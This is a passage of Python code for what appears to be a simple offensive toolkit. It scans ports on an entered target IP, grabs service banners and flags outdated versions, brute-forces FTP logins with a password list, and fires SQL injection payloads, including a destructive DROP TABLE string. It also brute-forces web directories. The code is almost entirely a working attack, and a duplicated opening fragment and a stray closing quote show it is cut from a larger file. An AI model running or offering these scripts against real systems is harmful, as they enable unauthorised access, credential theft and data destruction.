    open_ports = scan_ports(target, ports_to_scan)
   
    print("\n[*] Banner Grabbing and Vulnerability Check:")

    for port in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"\n[Port {port}] Service Banner: {banner}")
            print(" -&gt; " + check_vulnerabilities(banner))
        else:
            print(f"\n[Port {port}] No banner retrieved.")
    end_time = datetime.now()
    print("\n[*] Scan completed in:", end_time - start_time)



#FTP Brute Force, SQL Injection, Simple Dir Brute Force

import socket
import requests
import ftplib
from datetime import datetime

vulnerabilities = {
"Apache/2.2.8": "Outdated Apache version - vulnerable to CVE-2009-3555",
"OpenSSH_4.7": "Old OpenSSH version - possible remote exploits",
"Microsoft-IIS/6.0": "IIS 6.0 is deprecated - vulnerable to multiple attacks"
}

def scan_ports(target, ports):
    open_ports = []
    print(f"\n[*] Scanning {target} ...")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[+] Port {port} is OPEN")
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

def grab_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except:
        return None

def check_vulnerabilities(banner):
    for vuln in vulnerabilities:
        if vuln in banner:
            return vulnerabilities[vuln]
    return "No known vulnerability in database."

def ftp_bruteforce(target, user, wordlist):
    print(f"\n[*] Starting FTP Brute Force on {target}")
    for password in wordlist:
        try:
            ftp = ftplib.FTP(target)
            ftp.login(user, password)
            print(f"[+] Found credentials: {user}:{password}")
            ftp.quit()
            return
        except:
            print(f"[-] Failed: {user}:{password}")
            print("[!] No valid credentials found.")

def sql_injection_test(url, param):
    print(f"\n[*] Testing SQL Injection on {url}")
    payloads = ["&#39; OR &#39;1&#39;=&#39;1", "&#39; OR &#39;x&#39;=&#39;x", "&#39;; DROP TABLE users; --"]
    for payload in payloads:
        new_url = f"{url}?{param}={payload}"
        try:
            r = requests.get(new_url, timeout=3)
            if "error" in r.text.lower() or "syntax" in r.text.lower():
                print(f"[+] Possible SQL Injection vulnerability with payload: {payload}")
            else:
                print(f"[-] No error with payload: {payload}")

        except:
            print("[-] Request failed.")

def dir_bruteforce(url, wordlist):
    print(f"\n[*] Starting Directory Brute Force on {url}")
    for word in wordlist:
        test_url = f"{url}/{word}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"[+] Found directory: {test_url}")
        except:
            pass

if __name__ == "__main__":
    target = input("Enter Target IP (e.g., 127.0.0.1): ")
    ports_to_scan = [21, 22, 23, 25, 80, 110, 143, 443, 3389]
    start_time = datetime.now()
    open_ports = scan_ports(target, ports_to_scan)
    print("\n[*] Banner Grabbing and Vulnerability Check:")
    for port in open_ports:
        banner = grab_banner(target, port)
        if banner:
            print(f"\n[Port {port}] Service Banner: {banner}")
            print(" -&gt; " + check_vulnerabilities(banner))
        else:
            print(f"\n[Port {port}] No banner retrieved.")
   
    ftp_wordlist = ["1234", "admin", "password", "toor"]
    ftp_bruteforce(target, "admin", ftp_wordlist)
    sql_injection_test("http://127.0.0.1/vulnerable.php", "id")
    wordlist = ["admin", "login", "test", "uploads"]
    dir_bruteforce("http://127.0.0.1", wordlist)
    end_time = datetime.now()
    print("\n[*] Scan completed in:", end_time - start_time)
          ''')